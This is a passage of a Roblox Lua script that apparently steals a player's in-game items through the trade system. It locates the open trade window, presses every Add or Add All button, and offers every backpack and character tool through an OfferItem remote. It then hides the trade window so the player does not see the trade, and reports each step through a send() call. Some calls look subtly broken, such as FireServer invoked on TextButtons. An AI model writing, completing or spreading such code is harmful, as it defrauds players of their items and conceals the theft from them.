-- --- Function to describe a GUI object (for debugging)
local function describeGUI(obj, indent)
    indent = indent or 0
    local pad = string.rep("  ", indent)
    local info = pad .. obj.ClassName .. " : " .. obj.Name
    if obj:IsA("TextButton") or obj:IsA("TextLabel") then
        info = info .. " Text: '" .. (obj.Text or "") .. "'"
    end
    if obj:IsA("Frame") or obj:IsA("ScreenGui") then
        info = info .. " Size: " .. obj.AbsoluteSize.X .. "x" .. obj.AbsoluteSize.Y
        if obj:IsA("ScreenGui") then info = info .. " Enabled: " .. tostring(obj.Enabled) end
        if obj:IsA("Frame") then info = info .. " Visible: " .. tostring(obj.Visible) end
    end
    local desc = info .. "\n"
    for _, child in pairs(obj:GetChildren()) do
        desc = desc .. describeGUI(child, indent+2)
    end
    return desc
end

-- --- Find the trade window (mobile-friendly)
local function findTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end

    -- Collect all enabled ScreenGuis and visible large Frames
    local candidates = {}
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and obj.Enabled then
            local size = obj.AbsoluteSize
            if size.X > 200 and size.Y > 150 then
                table.insert(candidates, obj)
            end
        end
        if obj:IsA("Frame") and obj.Visible then
            local size = obj.AbsoluteSize
            if size.X > 200 and size.Y > 150 then
                table.insert(candidates, obj)
            end
        end
    end

    -- Filter candidates: must have Accept and Add buttons
    for _, obj in ipairs(candidates) do
        local name = obj.Name:lower()
        -- Ignore Lobby, Main, HUD, Background
        if not (name:find("lobby") or name:find("main") or name:find("hud") or name:find("background")) then
            local hasAccept, hasAdd = false, false
            for _, btn in pairs(obj:GetDescendants()) do
                if btn:IsA("TextButton") then
                    local text = (btn.Text or ""):lower()
                    local bName = btn.Name:lower()
                    if text:find("accept") or bName:find("accept") then hasAccept = true end
                    if text:find("add") or bName:find("add") or text:find("select") or bName:find("select") or text:find("+") then hasAdd = true end
                end
            end
            if hasAccept and hasAdd then
                return obj
            end
        end
    end
    return nil
end

-- --- Click all Add buttons (multiple strategies)
local function clickAddButtons(tradeWindow)
    if not tradeWindow then return 0 end
    local count = 0

    -- Strategy 1: Add All
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local text = (btn.Text or ""):lower()
            local name = btn.Name:lower()
            if text:find("add all") or name:find("add all") or text:find("select all") then
                pcall(function() btn:FireServer() end)
                send("✅ Clicked 'Add All'")
                return 1
            end
        end
    end

    -- Strategy 2: Click any button with "Add", "Select", or "+"
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local text = (btn.Text or ""):lower()
            local name = btn.Name:lower()
            if text:find("add") or name:find("add") or text:find("select") or name:find("select") or text:find("+") then
                pcall(function() btn:FireServer() end)
                count = count + 1
            end
        end
    end
    return count
end

-- --- Offer items via remote (fallback)
local function offerAllItemsViaRemote()
    if not OfferItem then return 0 end
    local count = 0
    -- Get tools from Backpack and Character
    local tools = {}
    for _, t in pairs(player.Backpack:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    for _, t in pairs(char:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t) end
    end
    if #tools == 0 then return 0 end
    for _, tool in ipairs(tools) do
        local ok = pcall(function() OfferItem:FireServer(tool) end)
        if not ok then ok = pcall(function() OfferItem:FireServer(tool.Name) end) end
        if ok then count = count + 1 end
        wait(0.1)
    end
    return count
end

-- --- Hide the trade window
local function hideTradeWindow(tradeWindow)
    if not tradeWindow then return end
    if tradeWindow:IsA("ScreenGui") then
        tradeWindow.Enabled = false
    else
        tradeWindow.Visible = false
        if tradeWindow.Parent and tradeWindow.Parent:IsA("ScreenGui") then
            tradeWindow.Parent.Enabled = false
        end
    end
end

